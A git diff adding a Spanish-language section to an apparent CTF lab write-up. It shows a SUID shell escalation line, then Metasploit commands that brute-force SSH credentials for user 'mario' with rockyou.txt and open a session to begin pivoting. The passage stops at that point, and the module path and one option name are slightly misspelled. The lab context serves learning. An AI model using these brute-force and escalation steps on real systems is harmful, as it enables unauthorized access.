@@ -468,3 +468,29 @@ sudo /usr/bin/env bin/sh -p
 ```
 
 Máquina completada: ✅
+
+---
+
+## Pivoting con Metasploit
+
+Vamos a partir de la máquina Kali para practicar el pivoting con Metasploit:
+
+Para obtener un meterpreter de la primera máquina sabemos que tenemos que acceder a través de ssh. Para ello usaremos metasploit para obtener una sesión con las credenciales de mario:
+```bash
+msfconsole
+use /scanner/ssh/ssh_login
+options
+set RHOSTS 10.10.10.2
+set USERNAME mario
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set STOP_ON_SUCESS true
+run
+```
+Nos encuentra la password y nos crea una sesión:
+<img width="1585" height="330" alt="imagen" src="https://github.com/user-attachments/assets/05e001f3-4af3-44c4-a869-42cf6f128216" />
+
+Nos conectamos a la sesión (ya tendríamos acceso a la primera máquina) y vamos a empezar el pivoting con Metasploit:
+```bash
+sessions -i 1
+```
+
